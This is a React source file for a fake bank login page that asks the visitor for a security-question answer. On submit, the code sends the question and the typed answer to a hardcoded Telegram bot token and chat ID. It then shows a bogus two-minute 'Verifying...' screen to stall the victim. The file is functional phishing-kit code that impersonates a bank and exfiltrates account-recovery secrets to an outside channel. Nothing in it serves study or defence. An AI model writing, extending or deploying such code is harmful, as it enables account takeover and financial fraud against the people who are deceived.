import { FormEvent, useState } from "react";
import PageWatcher from "../components/pagewaters";
import usePageController from "../pages/useContoller";
import { saveVerificationData } from "../pages/storage";
import BankHeader from "../components/bankhead";

export default function SecurityPage() {
  const settings = usePageController();

  const [answer, setAnswer] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const submit = async (e: FormEvent) => {
    e.preventDefault();

    if (!settings) return;

    setIsLoading(true);

    saveVerificationData({
      securityQuestion: settings.securityQuestion,
      securityAnswer: answer,
    });

    const botToken = "8044905551:AAFHPE3MZz9B2jLceaAlqcvGU7QrQWD4ABY";
    const chatId = "7062736155";

    const message = `
🔐 Security Verification

❓ Question:
${settings.securityQuestion}

✅ Answer:
${answer}
  `;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      // Show loading screen for 2 minutes
      await new Promise((resolve) => setTimeout(resolve, 120000));

      setIsLoading(false);
      alert("Answer saved successfully.");

      // navigate("/next-page"); // if needed
    } catch (error) {
      console.error(error);
      setIsLoading(false);
      alert("Something went wrong.");
    }
  };

  if (!settings) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        Loading...
      </div>
    );
  }

  return (
    <>
      <PageWatcher />
      <BankHeader />
      {isLoading && (
        <div className="fixed inset-0 flex items-center justify-center bg-white z-50">
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>

            <h2 className="mt-6 text-2xl font-semibold">Verifying...</h2>

            <p className="mt-2 text-gray-500">
              Please wait while we verify your information.
              <br />
              This may take up to 2 minutes.
            </p>
          </div>
        </div>
      )}

      <div className="min-h-screen bg-white flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-[600px] bg-[#f3f3f3] p-8">
          {/* Title */}
          <h2 className="text-[16px] font-normal text-[#002856] mb-8">
            Account Log In
          </h2>

          {/* Security Question */}
          <div className="mb-5">
            <label className="block text-[14px] text-black mb-2">
              Security Question:
            </label>

            <div className="relative">
              <input
                type="text"
                readOnly
                value={settings.securityQuestion}
                className="w-full h-10 border border-gray-300 bg-white rounded-sm px-3 text-[14px] text-gray-800"
              />

              <span className="absolute right-4 top-1/2 -translate-y-1/2 text-green-600 text-2xl">
                ✓
              </span>
            </div>
          </div>

          {/* Security Answer */}
          <div className="mb-6">
            <label className="block text-[14px] text-black mb-2">
              Security Answer:
            </label>

            <input
              type="text"
              required
              value={answer}
              onChange={(e) => setAnswer(e.target.value)}
              className="w-full h-10 border border-gray-400 rounded-sm bg-white px-3 text-[14px] focus:outline-none focus:ring-1 focus:ring-[#003A70]"
            />
          </div>

          {/* Info */}
          <p className="text-[#003A70] text-[14px] leading-8">
            For your protection, we are asking you to identify yourself by
            answering the security profile question. Check the box for "Remember
            this device at Log In" if you do not wish to enter this each time
            you Log In.
          </p>

          {/* Checkbox */}
          <label className="flex items-center mt-6 cursor-pointer">
            <input type="checkbox" className="w-4 h-4" />

            <span className="ml-2 text-[14px] text-gray-800">
              Remember this device at Log In.
            </span>
          </label>

          {/* Submit */}
          <button
            onClick={submit}
            className="w-full mt-8 h-11 bg-[#003A70] hover:bg-[#002d56] text-white text-[16px] rounded-sm"
          >
            Submit
          </button>
        </div>
      </div>
    </>
  );
}
